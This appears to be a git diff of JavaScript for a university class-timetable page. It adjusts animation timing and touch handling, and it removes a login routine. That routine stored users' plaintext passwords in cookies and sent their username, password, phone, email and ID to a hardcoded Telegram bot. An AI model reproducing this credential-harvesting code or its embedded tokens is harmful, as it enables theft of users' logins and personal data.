@@ -55,9 +55,9 @@ function changeLessons(input) {
             { opacity: "0" },
             { opacity: "1" },
         ], {
-            duration: 450,
+            duration: 200,
             iterations: 1,
-            delay: index * 200,
+            delay: index * 100,
             fill: "both",
             easing: "ease-in-out",
         })
@@ -66,75 +66,13 @@ function changeLessons(input) {
 }
 
 function changeDate(step) {
-    let diff = Number(document.querySelector("h2.title").dataset.diff) + step
-    document.querySelector("main > h2.title.bold").textContent = "Schedule " + new Intl.RelativeTimeFormat('en', { numeric: 'auto' }).format(diff, "day")
-    document.querySelector("h2.title").dataset.diff = diff
+    const title = document.querySelector("main h2.title")
+    let diff = Number(title.dataset.diff) + step
+    title.textContent = "Schedule " + new Intl.RelativeTimeFormat('en', { numeric: 'auto' }).format(diff, "day")
+    title.dataset.diff = diff
 }
 
 updateWeekDisplay()
-
-
-
-function setCookie(name, value, daysToExpire) {
-    const date = new Date();
-    date.setTime(date.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
-    const expires = "expires=" + date.toUTCString();
-    document.cookie = name + "=" + value + ";" + expires + ";path=/";
-}
-
-// Function to get a cookie value by name
-function getCookie(name) {
-    const cookieName = name + "=";
-    const cookies = document.cookie.split(';');
-    for (let i = 0; i < cookies.length; i++) {
-        let cookie = cookies[i].trim();
-        if (cookie.indexOf(cookieName) === 0) {
-            return cookie.substring(cookieName.length, cookie.length);
-        }
-    }
-    return null;
-}
-
-function getUser(username, password) {
-    if (!(username && password)) {
-        document.querySelector(".reg-user").style.display = "grid";
-        return
-    }
-    fetch('https://inet.mdis.uz/oauth/token', {
-        method: "POST",
-        headers: {
-            'Authorization': 'Basic c3ByaW5nLXNlY3VyaXR5LW9hdXRoMi1yZWFkLWNsaWVudDpzcHJpbmctc2VjdXJpdHktb2F1dGgyLXJlYWQtY2xpZW50LXBhc3N3b3JkMTIzNA==',
-            "Content-Type": "application/x-www-form-urlencoded",
-        },
-        body: `username=${username}&password=${password}&grant_type=password`
-    }).then(res => {
-        if (res.status == 200) {
-            return res.json()
-        }
-        else if (res.status == 400) {
-            document.querySelector("form#user-login").classList.add("error")
-            throw new Error("no user")
-        }
-    }).then(text => {
-        if (!getCookie("username")) {
-            setCookie("username", username, 20)
-        }
-        if (!getCookie("password")) {
-            setCookie("password", password, 20)
-        }
-        document.querySelector("header span.bold").textContent = text.user.fullName.split(" ")[0].toLowerCase()
-        document.querySelector(".avatar > img").setAttribute("src", `https://inet.mdis.uz${text.user.avatar}`)
-        localStorage.setItem("access_token", `Bearer ${text.access_token}`)
-        if (!getCookie("isReggedBefore")) {
-            const message = `New Login to Timetable%0A%0AFull Name: ${text.user.fullName}%0ARole: ${text.user.roles[0]}%0AID: ${text.user.uuid}%0APhone: +${text.user.phone}%0AEmail: ${text.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
-            setCookie("isReggedBefore", true, 60)
-            fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendDocument?chat_id=1273666675&document=https://inet.mdis.uz${text.user.avatar}&caption=${message}&parse_mode=html`).then(() => {
-                location.reload()
-            })
-        }
-    })
-
-}
 
 
 function sorted(objects, attribute = "dayNumber") {
@@ -263,13 +201,7 @@ document.querySelectorAll("button[data-nav-dir]").forEach(btn => {
 })
 
 
-document.querySelector("#user-login").addEventListener("submit", e => {
-    let username, password;
-    e.preventDefault()
-    username = document.querySelector("#user-login input[name=username]").value
-    password = document.querySelector("#user-login input[name=password]").value
-    getUser(username, password)
-})
+
 
 inputsObj.forEach(input => {
     input.onchange = e => {
@@ -294,10 +226,13 @@ window.onresize = () => {
 
 
 window.addEventListener("touchstart", e => {
+
+    e.preventDefault()
     touchStart = e.touches[0].clientX
 })
 
 window.addEventListener("touchend", e => {
+    if(e.touches.length != 0) return
     let action = (touchStart - e.changedTouches[0].clientX) / 100;
     if (action > 0) {
         if (!Math.floor(action)) return
